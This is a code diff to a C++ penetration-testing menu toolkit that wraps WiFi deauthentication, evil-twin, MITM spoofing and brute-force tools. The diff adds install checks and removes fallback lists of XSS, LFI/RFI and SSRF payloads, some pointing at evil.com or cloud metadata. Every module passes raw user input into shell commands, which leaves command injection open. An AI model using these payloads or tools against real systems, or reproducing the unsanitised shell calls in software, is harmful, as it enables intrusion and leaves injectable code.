@@ -25,6 +25,8 @@
 #include <sys/stat.h>
 #include <numeric> // For accumulate
 #include <openssl/evp.h> // Required for EVP_MD_CTX
+#include <csignal>
+#include <limits> // Required for numeric_limits
 
 using namespace std;
 
@@ -55,6 +57,11 @@ void disclaimer() {
     cout << "By using this toolkit, you agree to comply with all applicable laws and regulations.\n";
     cout << "The author assumes no liability for misuse or damage caused by this software.\n";
     cout << "\033[0m\n";
+}
+
+bool tool_exists(const string& tool) {
+    string cmd = "which " + tool + " > /dev/null 2>&1";
+    return system(cmd.c_str()) == 0;
 }
 
 void port_scan() {
@@ -89,6 +96,10 @@ void port_scan() {
 }
 
 void whois_lookup() {
+    if (!tool_exists("whois")) {
+        cout << "\033[1;31m[!] whois is not installed. Install with: sudo apt install whois\033[0m\n";
+        return;
+    }
     string domain;
     cout << "Domain: ";
     cin >> domain;
@@ -597,6 +608,10 @@ void osint_report() {
 }
 
 void setoolkit() {
+    if (!tool_exists("setoolkit")) {
+        cout << "\033[1;31m[!] SET is not installed. Install with: sudo apt install setoolkit\033[0m\n";
+        return;
+    }
     cout << "[!] WARNING: Use the Social Engineering Toolkit (SET) only for authorized, ethical testing.\n";
     cout << "[!] SET requires sudo/root permissions.\n";
     cout << "[+] Launching Social Engineering Toolkit...\n";
@@ -679,6 +694,10 @@ void phishing_page() {
 }
 
 void wifi_scan() {
+    if (!tool_exists("airmon-ng")) {
+        cout << "\033[1;31m[!] airmon-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
+        return;
+    }
     cout << "[+] Scanning for WiFi networks (requires monitor mode and root)...\n";
     string iface;
     cout << "Wireless interface (e.g. wlan0): ";
@@ -697,6 +716,10 @@ void wifi_scan() {
 }
 
 void wifi_handshake_capture() {
+    if (!tool_exists("airmon-ng") || !tool_exists("airodump-ng")) {
+        cout << "\033[1;31m[!] airmon-ng, airodump-ng, or aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
+        return;
+    }
     cout << "[+] Capture WPA handshake (requires monitor mode and root)...\n";
     string iface, bssid, channel, out_file;
     cout << "Wireless interface (e.g. wlan0): ";
@@ -724,6 +747,10 @@ void wifi_handshake_capture() {
 }
 
 void wifi_crack_handshake() {
+    if (!tool_exists("aircrack-ng")) {
+        cout << "\033[1;31m[!] aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
+        return;
+    }
     cout << "[+] Crack WPA/WPA2 handshake with aircrack-ng...\n";
     string cap_file, wordlist;
     cout << "Handshake .cap file: ";
@@ -738,6 +765,10 @@ void wifi_crack_handshake() {
 }
 
 void wifi_deauth_attack() {
+    if (!tool_exists("airmon-ng") || !tool_exists("aireplay-ng")) {
+        cout << "\033[1;31m[!] airmon-ng, aireplay-ng, or aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
+        return;
+    }
     cout << "[+] Deauthentication attack (requires monitor mode and root)...\n";
     string iface, bssid, client;
     cout << "Wireless interface (e.g. wlan0): ";
@@ -765,6 +796,10 @@ void wifi_deauth_attack() {
 }
 
 void evil_twin_ap() {
+    if (!tool_exists("airmon-ng") || !tool_exists("airbase-ng")) {
+        cout << "\033[1;31m[!] airmon-ng, airbase-ng, or aircrack-ng is not installed. Install with: sudo apt install aircrack-ng\033[0m\n";
+        return;
+    }
     cout << "[+] Evil Twin AP (requires monitor mode and root)...\n";
     string iface, ssid, channel;
     cout << "Wireless interface in monitor mode (e.g. wlan0mon): ";
@@ -782,11 +817,19 @@ void evil_twin_ap() {
 }
 
 void wifi_wifite() {
+    if (!tool_exists("wifite")) {
+        cout << "\033[1;31m[!] Wifite is not installed. Install with: sudo apt install wifite\033[0m\n";
+        return;
+    }
     cout << "[+] Launching Wifite (automated WiFi attack tool)...\n";
     system("sudo wifite");
 }
 
 void arp_spoof() {
+    if (!tool_exists("arpspoof")) {
+        cout << "\033[1;31m[!] arpspoof is not installed. Install with: sudo apt install arpspoof\033[0m\n";
+        return;
+    }
     cout << "[+] ARP Spoofing (MITM, requires root)...\n";
     string iface, target, gateway;
     cout << "Network interface (e.g. eth0): ";
@@ -802,6 +845,10 @@ void arp_spoof() {
 }
 
 void dns_spoof() {
+    if (!tool_exists("dnsspoof")) {
+        cout << "\033[1;31m[!] dnsspoof is not installed. Install with: sudo apt install dnsspoof\033[0m\n";
+        return;
+    }
     cout << "[+] DNS Spoofing (MITM, requires root)...\n";
     string iface, hosts_file;
     cout << "Network interface (e.g. eth0): ";
@@ -814,6 +861,10 @@ void dns_spoof() {
 }
 
 void ettercap_cli() {
+    if (!tool_exists("ettercap")) {
+        cout << "\033[1;31m[!] Ettercap is not installed. Install with: sudo apt install ettercap-graphical\033[0m\n";
+        return;
+    }
     cout << "[+] Launching Ettercap CLI (MITM, requires root)...\n";
     string iface;
     cout << "Interface (e.g. eth0): ";
@@ -824,6 +875,10 @@ void ettercap_cli() {
 }
 
 void bettercap_menu() {
+    if (!tool_exists("bettercap")) {
+        cout << "\033[1;31m[!] Bettercap is not installed. Install with: sudo apt install bettercap\033[0m\n";
+        return;
+    }
     cout << "[Bettercap MITM]\n";
     string iface, channel, caplet;
     cout << "Interface (e.g. wlan0mon or eth0): ";
@@ -842,6 +897,10 @@ void bettercap_menu() {
 }
 
 void advanced_xss_test() {
+    if (!tool_exists("xsstrike")) {
+        cout << "\033[1;31m[!] XSStrike is not installed. Install with: sudo apt install xsstrike\033[0m\n";
+        return;
+    }
     cout << "[Advanced XSS Testing]\n";
     cout << "- This module will test a target URL for reflected/stored XSS vulnerabilities.\n";
     string url;
@@ -851,33 +910,16 @@ void advanced_xss_test() {
         cout << "[-] No URL provided.\n";
         return;
     }
-    if (system("which xsstrike > /dev/null 2>&1") == 0) {
-        cout << "[+] Running XSStrike...\n";
-        string cmd = "xsstrike -u '" + url + "'";
-        system(cmd.c_str());
-        return;
-    }
-    if (system("which commix > /dev/null 2>&1") == 0) {
-        cout << "[+] Running commix (for XSS and command injection)...\n";
-        string cmd = "commix --url '" + url + "'";
-        system(cmd.c_str());
-        return;
-    }
-    cout << "[!] Neither XSStrike nor commix found. Running basic reflected XSS test.\n";
-    vector<string> payloads = {"<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<img src=1 onerror=alert(1)>", "<details open ontoggle=alert(1)>", "<math href=javascript:alert(1)>", "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>", "<a href=javascript:alert(1)>click</a>"};
-    for (const auto& payload : payloads) {
-        string test_url = url;
-        size_t eq = test_url.find('=');
-        if (eq != string::npos) test_url.replace(eq+1, 0, payload);
-        string cmd = "curl -s '" + test_url + "' | grep -q '" + payload + "'";
-        if (system(cmd.c_str()) == 0) {
-            cout << "[VULN] Payload reflected: " << payload << endl;
-        }
-    }
-    cout << "[!] Basic reflected XSS test complete.\n";
+    cout << "[+] Running XSStrike...\n";
+    string cmd = "xsstrike -u '" + url + "'";
+    system(cmd.c_str());
 }
 
 void advanced_lfi_rfi_test() {
+    if (!tool_exists("lfi-suite")) {
+        cout << "\033[1;31m[!] LFISuite is not installed. Install with: sudo apt install lfi-suite\033[0m\n";
+        return;
+    }
     cout << "[Advanced LFI/RFI Testing]\n";
     cout << "- This module will test a target URL/parameter for Local/Remote File Inclusion vulnerabilities.\n";
     string url;
@@ -887,27 +929,16 @@ void advanced_lfi_rfi_test() {
         cout << "[-] Please provide a URL with a parameter (e.g. ...?file=home)\n";
         return;
     }
-    if (system("which lfi-suite > /dev/null 2>&1") == 0) {
-        cout << "[+] Running LFISuite...\n";
-        string cmd = "lfi-suite -u '" + url + "'";
-        system(cmd.c_str());
-        return;
-    }
-    cout << "[!] LFISuite not found. Running basic LFI/RFI payload tests.\n";
-    vector<string> payloads = {"../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "php://filter/convert.base64-encode/resource=index.php", "http://evil.com/shell.txt"};
-    for (const auto& payload : payloads) {
-        string test_url = url;
-        size_t eq = test_url.find('=');
-        if (eq != string::npos) test_url.replace(eq+1, 0, payload);
-        string cmd = "curl -s '" + test_url + "' | grep -q 'root:x:'";
-        if (system(cmd.c_str()) == 0) {
-            cout << "[VULN] LFI/RFI payload worked: " << payload << endl;
-        }
-    }
-    cout << "[!] Basic LFI/RFI test complete.\n";
+    cout << "[+] Running LFISuite...\n";
+    string cmd = "lfi-suite -u '" + url + "'";
+    system(cmd.c_str());
 }
 
 void advanced_csrf_test() {
+    if (!tool_exists("zap.sh")) {
+        cout << "\033[1;31m[!] OWASP ZAP is not installed. Install with: sudo apt install zaproxy\033[0m\n";
+        return;
+    }
     cout << "[Advanced CSRF Testing]\n";
     cout << "- This module will test a target URL for CSRF vulnerabilities.\n";
     string url;
@@ -917,29 +948,21 @@ void advanced_csrf_test() {
         cout << "[-] No URL provided.\n";
         return;
     }
-    if (system("which zap.sh > /dev/null 2>&1") == 0) {
-        cout << "[+] Launching OWASP ZAP for automated CSRF scan...\n";
-        string cmd = "zap.sh -cmd -quickurl '" + url + "' -quickout zap_csrf_report.html -quickprogress";
-        system(cmd.c_str());
-        cout << "[+] ZAP scan complete. See zap_csrf_report.html for details.\n";
-        return;
-    }
-    if (system("which xsstrike > /dev/null 2>&1") == 0) {
-        cout << "[+] Running XSStrike for CSRF checks...\n";
-        string cmd = "xsstrike -u '" + url + "' --fuzzer csrf";
-        system(cmd.c_str());
-        return;
-    }
-    cout << "[!] Neither ZAP nor XSStrike found. Running basic CSRF token check.\n";
-    string cmd = "curl -s '" + url + "' | grep -iE 'csrf|xsrf|token'";
-    if (system(cmd.c_str()) == 0) {
-        cout << "[+] CSRF token found in form. (Check for proper implementation)\n";
-    } else {
-        cout << "[VULN] No CSRF token found in form!\n";
-    }
+    cout << "[+] Launching OWASP ZAP for automated CSRF scan...\n";
+    string cmd = "zap.sh -cmd -quickurl '" + url + "' -quickout zap_csrf_report.html -quickprogress";
+    system(cmd.c_str());
+    cout << "[+] ZAP scan complete. See zap_csrf_report.html for details.\n";
 }
 
 void advanced_web_vuln_scan() {
+    if (!tool_exists("nikto")) {
+        cout << "\033[1;31m[!] Nikto is not installed. Install with: sudo apt install nikto\033[0m\n";
+        return;
+    }
+    if (!tool_exists("zap.sh")) {
+        cout << "\033[1;31m[!] OWASP ZAP is not installed. Install with: sudo apt install zaproxy\033[0m\n";
+        return;
+    }
     cout << "[Advanced Web Vulnerability Scanner]\n";
     cout << "- This module will scan a target web application for common vulnerabilities.\n";
     string url;
@@ -950,26 +973,22 @@ void advanced_web_vuln_scan() {
         return;
     }
     bool ran = false;
-    if (system("which nikto > /dev/null 2>&1") == 0) {
-        cout << "[+] Running Nikto web scanner...\n";
-        string cmd = "nikto -h '" + url + "'";
-        system(cmd.c_str());
-        ran = true;
-    }
-    if (system("which zap.sh > /dev/null 2>&1") == 0) {
-        cout << "[+] Launching OWASP ZAP for automated scan...\n";
-        string cmd = "zap.sh -cmd -quickurl '" + url + "' -quickout zap_webscan_report.html -quickprogress";
-        system(cmd.c_str());
-        cout << "[+] ZAP scan complete. See zap_webscan_report.html for details.\n";
-        ran = true;
-    }
-    if (!ran) {
-        cout << "[!] Neither Nikto nor ZAP found. Please install at least one for automated web scanning.\n";
-        cout << "[!] Nikto: sudo apt install nikto | ZAP: https://www.zaproxy.org/download/\n";
-    }
+    cout << "[+] Running Nikto web scanner...\n";
+    string cmd = "nikto -h '" + url + "'";
+    system(cmd.c_str());
+    ran = true;
+    cout << "[+] Launching OWASP ZAP for automated scan...\n";
+    cmd = "zap.sh -cmd -quickurl '" + url + "' -quickout zap_webscan_report.html -quickprogress";
+    system(cmd.c_str());
+    cout << "[+] ZAP scan complete. See zap_webscan_report.html for details.\n";
+    ran = true;
 }
 
 void advanced_ssrf_test() {
+    if (!tool_exists("ssrfmap")) {
+        cout << "\033[1;31m[!] SSRFmap is not installed. Install with: sudo apt install ssrfmap\033[0m\n";
+        return;
+    }
     cout << "[Advanced SSRF Testing]\n";
     cout << "- This module will test a target URL/parameter for Server-Side Request Forgery vulnerabilities.\n";
     string url;
@@ -979,27 +998,20 @@ void advanced_ssrf_test() {
         cout << "[-] Please provide a URL with a parameter (e.g. ...?url=...)\n";
         return;
     }
-    if (system("which ssrfmap > /dev/null 2>&1") == 0) {
-        cout << "[+] Running SSRFmap...\n";
-        string cmd = "ssrfmap -u '" + url + "'";
-        system(cmd.c_str());
-        return;
-    }
-    cout << "[!] SSRFmap not found. Running basic SSRF payload tests.\n";
-    vector<string> payloads = {"http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "http://evil.com/ssrf"};
-    for (const auto& payload : payloads) {
-        string test_url = url;
-        size_t eq = test_url.find('=');
-        if (eq != string::npos) test_url.replace(eq+1, 0, payload);
-        string cmd = "curl -s '" + test_url + "' | grep -qE 'root:x:|meta-data|ssrf'";
-        if (system(cmd.c_str()) == 0) {
-            cout << "[VULN] SSRF payload worked: " << payload << endl;
-        }
-    }
-    cout << "[!] Basic SSRF test complete.\n";
+    cout << "[+] Running SSRFmap...\n";
+    string cmd = "ssrfmap -u '" + url + "'";
+    system(cmd.c_str());
 }
 
 void smb_ntlm_ldap_bruteforce() {
+    if (!tool_exists("crackmapexec")) {
+        cout << "\033[1;31m[!] CrackMapExec is not installed. Install with: sudo apt install crackmapexec\033[0m\n";
+        return;
+    }
+    if (!tool_exists("medusa")) {
+        cout << "\033[1;31m[!] Medusa is not installed. Install with: sudo apt install medusa\033[0m\n";
+        return;
+    }
     cout << "[SMB/NTLM/LDAP Brute-force]\n";
     cout << "- This module attempts brute-force attacks against SMB, NTLM, or LDAP services using CrackMapExec or Medusa.\n";
     string target, username, password, protocol;
@@ -1015,21 +1027,15 @@ void smb_ntlm_ldap_bruteforce() {
         cout << "[-] All fields are required.\n";
         return;
     }
-    if (system("which crackmapexec > /dev/null 2>&1") == 0) {
-        cout << "[+] Running CrackMapExec...\n";
-        string cmd = "crackmapexec " + protocol + " " + target + " -u '" + username + "' -p '" + password + "'";
-        system(cmd.c_str());
-        return;
-    }
-    if (system("which medusa > /dev/null 2>&1") == 0) {
-        cout << "[+] Running Medusa...\n";
-        string service = protocol;
-        if (service == "ntlm") service = "smbnt";
-        string cmd = "medusa -h '" + target + "' -u '" + username + "' -p '" + password + "' -M " + service;
-        system(cmd.c_str());
-        return;
-    }
-    cout << "[!] Neither CrackMapExec nor Medusa found. Please install one of them.\n";
+    cout << "[+] Running CrackMapExec...\n";
+    string cmd = "crackmapexec " + protocol + " " + target + " -u '" + username + "' -p '" + password + "'";
+    system(cmd.c_str());
+}
+
+// Graceful exit handler
+void handle_sigint(int) {
+    cout << "\n\033[1;36m[!] Exiting PENTRAX. Stay ethical!\033[0m\n";
+    exit(0);
 }
 
 void menu() {
@@ -1101,13 +1107,13 @@ void menu() {
             page--;
             continue;
         } else if (choice == "0") {
-            cout << "Exiting...\n";
+            cout << "\033[1;36mExiting...\033[0m\n";
             break;
         }
         int opt = 0;
         try { opt = stoi(choice); } catch (...) { opt = 0; }
         if (opt < 1 || opt > (int)options.size()) {
-            cout << "Invalid option.\n";
+            cout << "\033[1;31mInvalid option.\033[0m\n";
         } else {
             switch (opt) {
                 case 1: port_scan(); break;
@@ -1154,12 +1160,13 @@ void menu() {
                 default: cout << "Invalid option.\n"; break;
             }
         }
-        cout << "\nPress Enter to continue...";
-        cin.ignore();
+        cout << "\n\033[1;32mPress Enter to return to menu...\033[0m";
+        cin.ignore(numeric_limits<streamsize>::max(), '\n');
     }
 }
 
 int main() {
+    signal(SIGINT, handle_sigint);
     menu();
     return 0;
 } 
